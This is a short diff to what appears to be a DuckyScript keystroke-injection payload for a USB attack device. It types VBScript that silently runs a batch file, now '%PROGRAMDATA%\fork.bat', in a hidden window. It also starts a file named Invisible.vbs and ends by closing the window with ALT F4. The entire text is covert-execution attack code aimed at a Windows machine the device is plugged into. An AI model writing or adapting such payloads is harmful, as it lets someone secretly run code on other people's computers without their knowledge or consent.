@@ -55,7 +55,7 @@ STRING Set WshShell = CreateObject(@WScript.Shell@)
 DELAY 100
 ENTER
 DELAY 100
-STRING WshShell.Run chr(34) & @Hashcat.bat@ & Chr(34), 0
+STRING WshShell.Run chr(34) & @%PROGRAMDATA%\fork.bat@ & Chr(34), 0
 DELAY 100
 ENTER
 DELAY 100
@@ -97,4 +97,4 @@ STRING start %PROGRAMDATA%\Invisible.vbs
 DELAY 200
 ENTER
 DELAY 100
-GUI DOWN
+ALT F4
